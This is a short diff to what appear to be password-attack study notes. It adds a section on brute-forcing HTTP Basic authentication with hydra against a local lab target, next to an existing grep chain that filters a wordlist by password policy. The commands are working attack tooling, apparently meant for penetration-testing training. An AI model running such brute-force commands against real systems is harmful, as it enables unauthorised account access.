@@ -109,3 +109,12 @@ $ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9
 ```bash
 $ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '[!@#$%^&*].*[!@#$%^&*]' > jane-filtered.txt
 ```
+
+# Basic HTTP Authentication (Hydra)
+
+We can use the `http-get` hydra service to brute force the basic authentication target.
+
+```bash
+$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+```
+
